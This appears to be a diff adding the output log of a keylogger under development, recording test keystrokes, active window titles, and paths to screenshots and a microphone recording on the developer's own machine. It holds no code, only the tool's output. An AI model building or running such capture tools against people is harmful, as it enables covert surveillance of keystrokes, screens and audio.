+--- Logging started: 2025-04-15 11:24:16.886435 ---
+
+
+2025-04-15 11:24:21.539649 [chrome.exe – Nouvel onglet - Google Chrome]
+a
+[2025-04-15 11:24:21.540669] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-15\11-24-16\screenshot_112421.png
+sslema cfazf
+
+2025-04-15 11:24:46.667398 [Spotify.exe – Spotify Premium]
+ze
+[2025-04-15 11:24:46.667897] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-15\11-24-16\screenshot_112446.png
+ffzefzfz
+
+2025-04-15 11:24:50.797764 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-15 11:24:50.798624] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-15\11-24-16\screenshot_112450.png
+
+
+--- Logging started: 2025-04-15 11:28:06.626193 ---
+
+[2025-04-15 11:28:06.627983] 🎤 Audio recorded → C:\Users\asus\keylogger\2025-04-15\11-28-06\mic_112806.wav
+
+
+2025-04-15 11:29:19.657474 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-15 11:29:19.658327] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-15\11-28-06\screenshot_112919.png
